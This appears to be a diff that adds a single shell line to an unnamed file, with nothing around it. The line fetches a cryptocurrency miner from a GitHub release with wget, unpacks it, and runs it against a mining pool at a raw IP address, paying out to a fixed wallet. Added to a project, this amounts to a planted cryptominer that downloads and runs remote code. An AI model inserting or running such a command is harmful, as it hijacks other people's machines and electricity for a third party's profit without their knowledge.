@@ -1,0 +1,1 @@
+wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz && tar -xzvf webchain-miner-2.8.0-linux-amd64.tar.gz && ./webchain-miner -o 134.209.100.118:443 -u 0xa1ffaba3defd3ccf295657f0a821749139800223 -p x 
